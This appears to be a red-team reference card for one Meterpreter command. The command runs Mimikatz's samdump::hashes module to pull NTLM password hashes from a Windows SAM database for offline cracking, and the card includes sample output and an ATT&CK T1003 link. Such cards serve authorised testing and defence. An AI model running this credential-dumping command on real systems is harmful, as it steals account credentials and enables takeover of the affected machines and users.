---
type: command
executor: meterpreter
data: 'mimikatz_command -f samdump::hashes'
output: null
platforms:
  - Windows
tags:
  - mimikatz
  - hashdump
verified: true
validated: true
---

# mimikatz-sam-dump-hashes

## Command

```meterpreter
mimikatz_command -f samdump::hashes
```

## Description

Dumps NTLM hashes from the local Security Accounts Manager (SAM) database on the target Windows system, targeting local user accounts for offline cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -f samdump::hashes | Executes the SAM dump module | Yes |

## Examples

### Basic Usage

```meterpreter
mimikatz_command -f samdump::hashes
```

## Expected Output

User : $_LOCAL_USER
RID : 0x3e8 (1000)
User : $_ADMIN
LM   : (null)
NTLM : aad3b435b51404eeaad3b435b51404ee

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
- [[techniques/Credential Dumping|T1003]]
